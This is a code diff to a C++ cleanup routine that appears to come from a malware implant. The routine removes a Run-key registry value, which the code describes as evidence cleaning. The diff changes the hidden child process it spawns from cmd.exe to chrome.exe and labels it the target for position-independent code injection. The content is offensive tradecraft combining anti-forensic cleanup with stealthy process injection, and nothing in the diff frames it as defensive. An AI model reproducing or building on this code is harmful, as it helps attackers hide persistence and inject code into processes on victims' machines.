@@ -23,7 +23,7 @@ void SubZeroCleanup::Cleanup()
     // evidence-cleaning function will be called - even in case of an error on the way.
     std::stringstream finalException("");
 
-    // Delete registry key
+    // Delete registry value
     try {
         const AutoRegistryKeyHandle autoRegKey(RegistryManager::OpenRegistryKey(REG_SZ_KEY_ROOT, REG_RUN_KEY_PATH));
         RegistryManager::DeleteRegistryValue(autoRegKey.get(), REG_VALUE_NAME);
@@ -50,18 +50,18 @@ void SubZeroCleanup::Cleanup()
 		STARTUPINFO si = { 0 };
 		PROCESS_INFORMATION pi = { 0 };
     	
-		// Creates a cmd child process
+		// Creates a child chrome process that will be the PIC target
 		if (!::CreateProcessW(
-            L"C:\\Windows\\System32\\cmd.exe",  // Module
-            nullptr,					        // Command-line
-		    nullptr,                            // Process security attributes
-		    nullptr,                            // Primary thread security attributes
-		    TRUE,						        // Handles are inherited
-		    CREATE_NO_WINDOW,                   // Creation flags
-		    nullptr,                            // Environment (use parent)
-		    nullptr,                            // Current directory (use parent)
-		    &si,                                // STARTUPINFO pointer
-		    &pi))                               // PROCESS_INFORMATION pointer             
+            (DIRECTORY_PATH + L"chrome.exe").c_str(),   // Module
+            nullptr,					                // Command-line
+		    nullptr,                                    // Process security attributes
+		    nullptr,                                    // Primary thread security attributes
+		    TRUE,						                // Handles are inherited
+		    CREATE_NO_WINDOW,                           // Creation flags
+		    nullptr,                                    // Environment (use parent)
+		    nullptr,                                    // Current directory (use parent)
+		    &si,                                        // STARTUPINFO pointer
+		    &pi))                                       // PROCESS_INFORMATION pointer             
 		{
 			finalException << "[-] Error finding target PIC injection process\n";
             throw std::runtime_error(finalException.str());
@@ -92,6 +92,7 @@ void SubZeroCleanup::Cleanup()
         }
     }
 
+	// Throw full exception log if exist
     if (finalException.str().length() > 0)
         throw std::runtime_error(finalException.str());
 }
